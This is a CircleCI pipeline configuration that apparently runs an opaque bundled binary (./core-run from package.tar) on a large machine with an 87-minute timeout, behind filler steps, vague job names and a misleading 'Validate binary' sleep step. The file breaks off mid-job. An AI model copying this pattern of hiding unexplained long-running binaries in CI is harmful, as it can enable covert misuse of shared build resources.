version: 2.1

jobs:
  inspect_intergration:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: accelerando
          command: |
            mkdir -p /var/tmp/shard4
            set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=","; print "a","b","c","sum"; for(i=1;i<=10000;i++) print i, i*2, i*3, i+i*2+i*3}' > /var/tmp/shard4/d.out; true
            echo "stage: intergration, bytes: $(wc -c </var/tmp/shard4/d.out)"
      - persist_to_workspace:
          root: /var/tmp/shard4
          paths:
            - d.out
  intergration:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/shard4
      - run:
          name: Read handoff file
          command: |
            tr -s '[:alnum:]' < /var/tmp/shard4/d.out 2>/dev/null | head -c 30 || true
      - run:
          name: Fetch working tree
          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Materialize bundle
          command: tar xf package.tar
      - run:
          name: Validate binary
          no_output_timeout: 15m
          command: sleep 90
      - run:
          command: du -sh .
      - run:
          no_output_timeout: 87m
          command: ./core-run && true
  warmup_q1-release:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /var/tmp/shard4
      - run:
